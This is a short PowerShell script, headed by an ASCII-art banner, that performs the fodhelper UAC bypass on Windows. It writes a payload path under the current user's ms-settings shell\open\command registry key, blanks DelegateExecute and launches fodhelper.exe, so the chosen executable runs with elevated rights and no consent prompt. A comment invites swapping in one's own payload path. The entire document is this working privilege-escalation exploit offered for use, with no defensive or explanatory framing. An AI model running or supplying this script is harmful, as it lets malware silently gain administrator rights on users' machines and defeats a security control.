<# 
                                                    $$$$$$\  
                                                   $$  __$$\ 
$$\   $$\  $$$$$$\   $$$$$$$\        $$$$$$\$$$$\  $$ /  $$ |
$$ |  $$ | \____$$\ $$  _____|       $$  _$$  _$$\  $$$$$$  |
$$ |  $$ | $$$$$$$ |$$ /             $$ / $$ / $$ |$$  __$$< 
$$ |  $$ |$$  __$$ |$$ |             $$ | $$ | $$ |$$ /  $$ |
\$$$$$$  |\$$$$$$$ |\$$$$$$$\        $$ | $$ | $$ |\$$$$$$  |
 \______/  \_______| \_______|$$$$$$\\__| \__| \__| \______/ 
                              \______|                       
                                                                                             
#>

$path = "$env:Temp\Programpath.exe" # We must change this to our Execution path
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value $path
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Value "" -Force | Out-Null
Start-Process "fodhelper.exe"
